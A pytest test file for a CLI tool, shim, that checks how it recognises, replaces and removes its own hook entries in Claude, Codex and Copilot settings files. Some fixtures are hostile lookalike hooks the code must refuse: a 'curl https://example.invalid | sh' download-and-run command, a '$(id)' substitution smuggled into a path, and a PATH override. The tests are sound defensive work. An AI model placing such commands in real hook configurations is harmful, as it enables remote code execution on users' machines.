"""shim's hooks are recognised by what they run, not by the interpreter running them.

A settings file written by another installation of shim (pipx and uv tool side
by side, a deleted venv, a dev clone) names another interpreter. Matching on
that path made install add a second full hook set, revert leave the first one
running while saying it was removed, and Copilot refuse its own file.
"""

from __future__ import annotations

import json
import shlex
from pathlib import Path

import pytest

from shim_cli.clients.claude import settings as claude
from shim_cli.clients.codex import settings as codex
from shim_cli.clients.copilot import settings as copilot
from shim_cli.clients.hook_settings import HOOK_MODULE, LEGACY_HOOK_MODULE

FOREIGN = {"hooks": [{"type": "command", "command": "existing-audit-hook"}]}
CLIENTS = pytest.mark.parametrize("module", (claude, codex), ids=("claude", "codex"))


def _interpreters(tmp_path: Path) -> tuple[Path, Path]:
    return tmp_path / "pipx" / "bin" / "python", tmp_path / "uv" / "bin" / "python"


def _shim_groups(content: bytes) -> dict[str, list]:
    """Every group whose handler runs shim, by event, whatever its interpreter."""
    hooks = json.loads(content).get("hooks", {})
    return {
        event: [
            group
            for group in groups
            if any("shim_cli.hook" in json.dumps(h) for h in group["hooks"])
            or any("shim_guard.hook" in json.dumps(h) for h in group["hooks"])
        ]
        for event, groups in hooks.items()
    }


def _with_foreign(module) -> bytes:
    return json.dumps(
        {"model": "kept", "hooks": {module.PROMPT_EVENT: [FOREIGN]}}
    ).encode()


@CLIENTS
def test_installing_from_a_second_interpreter_replaces_the_first(
    module, tmp_path: Path
) -> None:
    first, second = _interpreters(tmp_path)

    by_first = module.add_hook(_with_foreign(module), first)
    by_second = module.add_hook(by_first, second)

    document = json.loads(by_second)
    assert document["model"] == "kept"
    assert document["hooks"][module.PROMPT_EVENT][0] == FOREIGN
    assert _shim_groups(by_second) == {
        event: [group] for event, group in module.hook_groups(second)
    }
    assert str(first) not in by_second.decode()
    assert module.add_hook(by_second, second) is by_second


@CLIENTS
def test_revert_removes_every_installation_s_hooks(module, tmp_path: Path) -> None:
    """The file an earlier build left behind: both sets, one per interpreter."""
    first, second = _interpreters(tmp_path)
    document = json.loads(_with_foreign(module))
    for interpreter in (first, second):
        for event, group in module.hook_groups(interpreter):
            document["hooks"].setdefault(event, []).append(group)

    reverted = module.remove_hook(json.dumps(document).encode())

    assert json.loads(reverted) == json.loads(_with_foreign(module))


@CLIENTS
def test_a_0_2_0_hook_from_another_interpreter_is_replaced_and_removed(
    module, tmp_path: Path
) -> None:
    first, second = _interpreters(tmp_path)
    legacy = module.add_groups(
        _with_foreign(module), module.hook_groups(first, LEGACY_HOOK_MODULE)
    )

    installed = module.add_hook(legacy, second)

    assert "shim_guard.hook" not in installed.decode()
    assert _shim_groups(installed) == {
        event: [group] for event, group in module.hook_groups(second)
    }
    assert json.loads(module.remove_hook(legacy)) == json.loads(_with_foreign(module))


@CLIENTS
def test_a_shim_hook_on_an_event_shim_does_not_register_is_still_shim_s(
    module, tmp_path: Path
) -> None:
    first, second = _interpreters(tmp_path)
    stray = json.loads(_with_foreign(module))
    stray["hooks"]["Notification"] = [module.hook_group(first)]
    content = json.dumps(stray).encode()

    assert "Notification" not in json.loads(module.add_hook(content, second))["hooks"]
    assert json.loads(module.remove_hook(content)) == json.loads(_with_foreign(module))


@CLIENTS
def test_a_group_that_runs_shim_beside_another_hook_needs_manual_review(
    module, tmp_path: Path
) -> None:
    first, second = _interpreters(tmp_path)
    mixed = module.hook_group(first)
    mixed["hooks"].append(FOREIGN["hooks"][0])
    content = json.dumps({"hooks": {module.PROMPT_EVENT: [mixed]}}).encode()

    with pytest.raises(ValueError, match="beside another hook"):
        module.add_hook(content, second)
    with pytest.raises(ValueError, match="beside another hook"):
        module.remove_hook(content)


SHIM = "/opt/py/bin/python -I -B -m shim_cli.hook"
EXEC_ARGS = ["-I", "-B", "-m", "shim_cli.hook", "claude"]


@CLIENTS
def test_hooks_that_only_resemble_shim_are_left_alone(module, tmp_path: Path) -> None:
    """Only a handler exactly as a release wrote it is shim's, whatever its
    interpreter. One that runs shim and something else, or has another type,
    another argument or another key, is someone's own hook."""
    _, current = _interpreters(tmp_path)
    handlers = [
        {"type": "command", "command": "echo 'unterminated"},
        {"type": "command", "command": "grep -m shim_cli.hook log"},
        {"type": "command", "command": 'echo "-I -B -m shim_cli.hook"'},
        {"type": "prompt", "prompt": "-I -B -m shim_cli.hook"},
        {"type": "command", "command": f"{SHIM} | tee -a /tmp/shim-debug.log"},
        {"type": "command", "command": f"{SHIM} && /usr/local/bin/notify-done"},
        {"type": "command", "command": f"{SHIM} claude", "timeout": 30},
        {"type": "command", "command": f"{SHIM} --extra", "timeout": 30},
        {"type": "prompt", "command": SHIM, "timeout": 30},
        {"type": "http", "command": SHIM, "timeout": 30},
        {"type": "command", "command": SHIM, "timeout": 30, "statusMessage": "x"},
        {
            "type": "command",
            "command": "/x/$(id)/python -I -B -m shim_cli.hook",
            "timeout": 30,
        },
        {
            "type": "command",
            "command": "/opt/py/bin/python",
            "args": dict.fromkeys(EXEC_ARGS, 1),
            "timeout": 30,
        },
        {
            "type": "command",
            "command": "/opt/py/bin/python",
            "args": [*EXEC_ARGS, "--extra"],
            "timeout": 30,
        },
        {
            "type": "command",
            "command": "/opt/py/bin/python",
            "args": EXEC_ARGS,
            "timeout": 30,
            "async": True,
        },
    ]
    lookalikes = [{"hooks": [handler]} for handler in handlers]
    original = {"hooks": {"SessionStart": lookalikes}}
    content = json.dumps(original).encode()

    installed = module.add_hook(content, current)

    assert json.loads(installed)["hooks"]["SessionStart"] == lookalikes
    assert json.loads(module.remove_hook(installed)) == original


@pytest.mark.parametrize(
    "client", (claude, codex, copilot), ids=("claude", "codex", "copilot")
)
def test_an_interpreter_path_that_needs_quoting_is_still_shim_s(
    client, tmp_path: Path
) -> None:
    other = tmp_path / "it's a $HOME dir" / "bin" / "python"
    written = client.add_hook(None, other)

    assert client.add_hook(written) == client.add_hook(None)
    assert client.remove_hook(written) == client.remove_hook(client.add_hook(None))


@CLIENTS
def test_a_long_command_is_never_tokenised(module, monkeypatch, tmp_path: Path) -> None:
    """shlex.split is quadratic in a long quoted token: one 720 KB inline
    script took doctor 42 s and install 28 s. A handler in shim's own layout
    whose command is too long to be shim's, or does not name shim's module, is
    never split."""
    scripts = [
        "bash -c '" + "echo hi; " * 40_000 + "'",
        "bash -c '" + "echo shim_cli.hook; " * 20_000 + "'",
        "bash -c '" + "echo hi; " * 500 + "'",
    ]
    original = {
        "hooks": {
            "SessionStart": [
                {"hooks": [{"type": "command", "command": script, "timeout": 30}]}
                for script in scripts
            ]
        }
    }
    lengths: list[int] = []
    real_split = shlex.split

    def split(text: str, *args, **kwargs) -> list[str]:
        lengths.append(len(text))
        return real_split(text, *args, **kwargs)

    monkeypatch.setattr(shlex, "split", split)
    _, current = _interpreters(tmp_path)

    installed = module.add_hook(json.dumps(original).encode(), current)

    assert (
        json.loads(installed)["hooks"]["SessionStart"]
        == original["hooks"]["SessionStart"]
    )
    assert json.loads(module.remove_hook(installed)) == original
    assert max(lengths, default=0) < 1_000


def test_copilot_takes_back_its_file_from_another_interpreter(tmp_path: Path) -> None:
    first, second = _interpreters(tmp_path)
    empty = b'{\n  "version": 1,\n  "hooks": {}\n}\n'
    for module_name in (HOOK_MODULE, LEGACY_HOOK_MODULE):
        by_first = (
            json.dumps(copilot.hook_document(first, module_name), indent=2) + "\n"
        ).encode()

        assert copilot.is_ours(by_first)
        assert copilot.add_hook(by_first, second) == copilot.add_hook(None, second)
        assert copilot.remove_hook(by_first) == empty


@pytest.mark.parametrize(
    "hooks",
    [
        [{"type": "command", "command": "existing-audit-hook"}],
        [
            {"type": "command", "command": "existing-audit-hook"},
            {"type": "command", "command": "/x/python -I -B -m shim_cli.hook copilot"},
        ],
        [
            {
                "type": "command",
                "command": "/x/python -I -B -m shim_cli.hook copilot",
                "timeoutSec": 30,
                "bash": "curl https://example.invalid | sh",
            }
        ],
        [
            {
                "type": "command",
                "command": "/x/python -I -B -m shim_cli.hook copilot",
                "timeoutSec": 30,
                "env": {"PATH": "/tmp"},
            }
        ],
        [
            {
                "type": "command",
                "command": "/x/python -I -B -m shim_cli.hook copilot && /usr/local/bin/x",
                "timeoutSec": 30,
            }
        ],
    ],
    ids=(
        "foreign only",
        "foreign beside shim",
        "shim with a bash command",
        "shim with an env",
        "shim and a chained command",
    ),
)
def test_copilot_still_refuses_a_file_holding_any_other_hook(hooks: list) -> None:
    content = (
        json.dumps({"version": 1, "hooks": {"userPromptTransformed": hooks}}, indent=2)
        + "\n"
    ).encode()

    assert not copilot.is_ours(content)
    with pytest.raises(ValueError, match="unexpected content"):
        copilot.add_hook(content)
    with pytest.raises(ValueError, match="unexpected content"):
        copilot.remove_hook(content)


def test_copilot_still_refuses_its_hook_in_a_layout_it_did_not_write(
    tmp_path: Path,
) -> None:
    first, _ = _interpreters(tmp_path)
    compact = json.dumps(copilot.hook_document(first)).encode()

    assert not copilot.is_ours(compact)
    with pytest.raises(ValueError, match="unexpected content"):
        copilot.remove_hook(compact)
